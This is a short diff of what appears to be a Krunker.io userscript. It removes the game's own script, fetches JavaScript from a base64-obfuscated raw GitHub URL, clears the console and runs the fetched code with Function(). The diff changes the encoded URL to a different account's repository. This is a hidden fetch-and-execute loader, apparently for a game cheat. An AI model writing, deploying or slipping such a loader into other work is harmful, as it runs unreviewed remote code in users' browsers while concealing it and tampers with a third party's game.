@@ -38,7 +38,7 @@ const observer = new MutationObserver(function (e) {
         if (n.tagName === "SCRIPT" && n.innerHTML.includes("@license Krunker.io")) {
           n.remove();
           window[id]();
-          const e = inject(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bpbmd1cnVzMTk5NS9NYWluSlMvbWFpbi9tYWluLmpz"));
+          const e = inject(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RoZVVzZXJTT1MvTWFpbkpTL21haW4vbWFpbi5qcw=="));
           console.clear();
           Function(e)();
         }
